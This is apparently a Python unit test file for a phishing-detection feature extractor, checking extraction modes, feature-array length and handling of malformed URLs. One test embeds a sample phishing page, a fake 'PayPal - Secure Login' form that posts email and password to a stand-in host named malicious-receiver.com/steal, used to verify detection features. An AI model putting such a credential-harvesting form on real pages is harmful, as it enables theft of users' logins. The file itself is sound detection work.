"""
test_extractor.py — Unit tests for FeatureExtractor
"""

from __future__ import annotations

import unittest
from ml.v2.features.extractor import FeatureExtractor


class TestExtractor(unittest.TestCase):

    def test_url_only_mode(self):
        extractor = FeatureExtractor()
        url = "https://paypal-login.suspicious.tk/verify/account?token=abc123"
        feats = extractor.extract(url)

        # All reputation features must match schema missing_fill
        reputation_features = extractor.schema.features_by_group("reputation")
        self.assertGreater(len(reputation_features), 0)
        for name in reputation_features:
            expected = extractor.schema.missing_fill(name)
            self.assertEqual(feats[name], expected, f"{name}: {feats[name]} != {expected}")

        # All page_content features must match schema missing_fill
        content_features = extractor.schema.features_by_group("page_content")
        self.assertGreater(len(content_features), 0)
        for name in content_features:
            expected = extractor.schema.missing_fill(name)
            self.assertEqual(feats[name], expected, f"{name}: {feats[name]} != {expected}")

        # Mode must be url-only
        mode = extractor.get_mode()
        self.assertEqual(mode, "url-only")

    def test_with_html_content_populated(self):
        extractor = FeatureExtractor()
        url = "https://paypal.fake-security.com/login"
        html = """
        <html>
          <head><title>PayPal - Secure Login</title></head>
          <body>
            <form action="http://malicious-receiver.com/steal" method="POST">
              <input type="text" name="email" />
              <input type="password" name="password" />
              <input type="submit" value="Log In" />
            </form>
          </body>
        </html>
        """
        feats = extractor.extract(url, html=html)
        self.assertEqual(feats["has_password_field"], 1.0)
        self.assertEqual(feats["form_action_cross_domain"], 1.0)
        self.assertEqual(feats["null_action_form"], 0.0)

    def test_mode_string(self):
        extractor = FeatureExtractor()
        self.assertEqual(extractor.get_mode(), "url-only")
        self.assertEqual(extractor.get_mode(html="<html></html>"), "url+content")
        self.assertEqual(extractor.get_mode(whois_data={"registrar": "Godaddy"}), "url+reputation")
        self.assertEqual(
            extractor.get_mode(
                html="<html></html>",
                whois_data={"registrar": "Godaddy"},
            ),
            "full",
        )

    def test_extract_as_array_length(self):
        extractor = FeatureExtractor()
        url = "https://example.com/test"
        arr = extractor.extract_as_array(url)
        self.assertEqual(len(arr), extractor.schema.feature_count)

    def test_no_crash_on_garbage_url(self):
        extractor = FeatureExtractor()
        garbage_inputs = [
            "",
            "   ",
            "://invalid-url",
            "http://",
            "12345",
            "%%%%%",
            "https://[::1]:999999/path",
            None,
        ]
        for g in garbage_inputs:
            feats = extractor.extract(g)  # type: ignore
            self.assertIsInstance(feats, dict)
            arr = extractor.extract_as_array(g)  # type: ignore
            self.assertEqual(len(arr), extractor.schema.feature_count)


if __name__ == "__main__":
    unittest.main()
